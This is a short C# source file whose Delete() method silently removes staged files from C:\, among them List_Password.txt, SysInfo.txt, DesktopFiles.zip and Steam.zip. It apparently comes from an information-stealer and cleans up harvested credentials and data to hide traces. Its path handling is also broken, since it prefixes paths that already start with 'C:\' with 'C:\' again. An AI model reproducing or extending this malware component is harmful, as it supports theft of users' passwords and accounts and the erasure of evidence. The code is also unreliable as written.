using System;
using System.IO;

internal class OneWait
{
    #region Path
    static string PathTxt = @"C:\";
    static string[] FrostFiles = { @"C:\List_Password.txt", @"C:\SysInfo.txt", @"C:\" + Environment.UserName + ".txt", @"C:\DesktopFiles.zip", @"C:\Steam.zip" };
    #endregion Path
    public static void Delete()
    {
        try
        {
            DirectoryInfo directoryInfo = new DirectoryInfo(PathTxt);
            for (int i = 0; i < FrostFiles.Length; i++)
            {
                if (File.Exists(directoryInfo + FrostFiles[i]))
                {
                    File.Delete(directoryInfo + FrostFiles[i]);
                }
                else { }
            }
        }
        catch { }
    }
}